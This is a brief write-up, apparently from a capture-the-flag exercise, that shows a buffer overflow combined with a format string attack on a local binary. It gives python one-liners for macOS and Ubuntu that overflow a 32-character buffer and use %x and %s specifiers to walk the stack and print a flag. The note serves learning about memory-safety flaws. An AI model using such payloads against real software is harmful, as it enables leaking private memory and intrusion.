Basic format string attack and buffer overflow
However, this will work differently depending on the OS because of the way the compiler assigns values to the stack.

On Macs:
python -c "print 'A'*32 + '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s'" | ./a.out

On Ubuntu:
python -c "print 'A'*32 + '%x.%x.%x.%s'" | ./a.out

First, overflow the 32 char name buffer, and then pop values off the stack using
the %x string formatting character until you get to the pointer for the flag, on
which you use the %s formatting character to print the flag.
